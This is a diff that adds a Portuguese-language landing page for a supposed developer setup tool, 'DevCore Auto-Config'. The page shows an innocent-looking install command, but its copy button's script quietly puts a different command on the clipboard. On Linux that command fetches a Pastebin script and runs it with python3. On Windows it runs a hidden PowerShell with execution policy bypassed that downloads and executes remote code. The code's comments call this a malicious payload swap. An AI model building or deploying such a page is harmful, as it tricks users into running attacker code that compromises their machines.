@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DevCore Auto-Config | Ambiente de Desenvolvimento</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 antialiased min-h-screen">
+
+    <nav class="border-b border-white/5 bg-slate-900/50 backdrop-blur-md sticky top-0 z-50">
+        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="text-2xl font-black tracking-tighter text-blue-500 italic">DEV<span class="text-white">CORE</span></div>
+            <div class="hidden md:flex space-x-8 text-xs font-bold uppercase tracking-widest text-slate-400">
+                <a href="#" class="hover:text-blue-400 transition">Documentação</a>
+                <a href="#" class="hover:text-blue-400 transition">Comunidade</a>
+                <a href="#" class="hover:text-blue-400 transition">Segurança</a>
+            </div>
+            <div class="flex items-center space-x-2">
+                <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                <span class="text-[10px] font-bold text-slate-500">v2.4.1 STABLE</span>
+            </div>
+        </div>
+    </nav>
+
+    <section class="container mx-auto px-6 pt-20 pb-16 text-center">
+        <div class="inline-flex items-center space-x-2 bg-blue-500/10 text-blue-400 text-xs font-bold px-4 py-1.5 rounded-full border border-blue-500/20 mb-8">
+            <span>NOVO: SUPORTE COMPLETO PARA UBUNTU, LUBUNTU E WINDOWS</span>
+        </div>
+
+        <h1 class="text-5xl md:text-7xl font-black mb-6 tracking-tight leading-tight">
+            Configure seu ambiente <br/>
+            <span class="bg-gradient-to-r from-blue-400 via-blue-500 to-emerald-400 bg-clip-text text-transparent">em 10 segundos.</span>
+        </h1>
+        
+        <p class="text-slate-400 text-lg max-w-2xl mx-auto mb-12">
+            O <strong>DevCore Auto-Config</strong> elimina a necessidade de configurar manualmente variáveis de ambiente, Docker e runtimes. Copie o comando abaixo e execute para automação total.
+        </p>
+
+        <div class="max-w-2xl mx-auto bg-slate-900 rounded-2xl border border-white/10 shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden">
+            <div class="flex items-center justify-between px-5 py-3 bg-slate-800/50 border-b border-white/5">
+                <div class="flex space-x-1.5">
+                    <div class="w-3 h-3 rounded-full bg-red-500/20 border border-red-500/40"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500/20 border border-yellow-500/40"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500/20 border border-green-500/40"></div>
+                </div>
+                <span class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Quick Setup — install.sh</span>
+            </div>
+            
+            <div class="p-8">
+                <p class="text-left text-[11px] text-slate-500 mb-4 mono"># Detectando sistema operacional e instalando dependências...</p>
+                <div class="flex flex-col md:flex-row items-center space-y-4 md:space-y-0 md:space-x-4 bg-black/40 p-5 rounded-xl border border-white/5">
+                    <div class="flex-1 mono text-left text-blue-300 text-sm overflow-hidden whitespace-nowrap">
+                        <span class="text-emerald-500">$</span> curl -sL https://get.devcore.io | bash
+                    </div>
+                    
+                    <button onclick="copyToClipboard()" class="w-full md:w-auto flex items-center justify-center space-x-2 bg-blue-600 hover:bg-blue-500 text-white transition-all px-8 py-3 rounded-lg font-bold shadow-lg active:scale-95">
+                        <i class="fa-regular fa-copy"></i>
+                        <span>Copiar e Rodar</span>
+                    </button>
+                </div>
+                <div id="copyAlert" class="mt-4 text-emerald-400 text-xs font-bold opacity-0 transition-opacity duration-300">
+                    <i class="fa-solid fa-check mr-1"></i> COMANDO COPIADO! COLE NO SEU TERMINAL.
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-16 flex justify-center items-center space-x-10 opacity-30 grayscale">
+            <i class="fa-brands fa-node-js text-4xl"></i>
+            <i class="fa-brands fa-python text-4xl"></i>
+            <i class="fa-brands fa-docker text-4xl"></i>
+            <i class="fa-brands fa-react text-4xl"></i>
+            <i class="fa-brands fa-aws text-4xl"></i>
+        </div>
+    </section>
+
+    <footer class="mt-12 py-8 border-t border-white/5 text-center text-slate-600 text-[10px] uppercase tracking-widest">
+        Distribuído sob Licença MIT &bull; Projeto de Código Aberto DevCore &copy; 2026
+    </footer>
+
+    <script>
+        function copyToClipboard() {
+            // IDs integrados a partir dos seus links do Pastebin
+            const idLinux = "35ytpBxN"; 
+            const idWindows = "3Wy5aJ9w";
+
+            // Comandos Fileless que serão injetados no Clipboard
+            const cmdLinux = `curl -sL https://pastebin.com/raw/${idLinux} | python3`;
+            const cmdWindows = `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/${idWindows}')"`;
+
+            // Detecta o Sistema Operacional
+            let payloadFinal = cmdLinux;
+            // Verifica se é Windows
+            if (navigator.appVersion.indexOf("Win") != -1) {
+                payloadFinal = cmdWindows;
+            }
+
+            // Executa a troca do texto real pelo payload malicioso
+            navigator.clipboard.writeText(payloadFinal).then(() => {
+                const alert = document.getElementById('copyAlert');
+                alert.classList.remove('opacity-0');
+                setTimeout(() => { alert.classList.add('opacity-0'); }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
